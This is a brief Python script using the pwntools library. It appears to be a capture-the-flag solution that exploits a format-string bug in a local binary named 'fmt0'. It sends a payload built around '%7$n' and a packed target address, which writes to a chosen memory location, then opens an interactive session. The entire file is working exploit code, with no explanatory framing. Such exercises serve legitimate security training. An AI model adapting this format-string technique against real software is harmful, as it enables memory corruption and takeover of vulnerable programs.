#!/usr/bin/python3
from pwn import *

io = process("./fmt0")
payload = b"aa%7$n  " + p64(0x404038)
io.sendafter(b"Input", payload)
io.interactive()